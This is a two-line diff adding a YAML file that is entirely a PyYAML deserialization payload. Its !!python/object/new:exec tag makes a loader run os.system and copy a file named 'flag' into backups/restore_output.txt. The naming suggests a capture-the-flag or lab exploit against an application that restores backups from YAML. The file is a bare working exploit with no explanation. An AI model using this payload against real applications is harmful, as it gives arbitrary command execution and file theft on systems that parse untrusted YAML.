@@ -1,0 +1,2 @@
+angel: !!python/object/new:exec
+    args: ['__import__("os").system("cat flag > backups/restore_output.txt")']
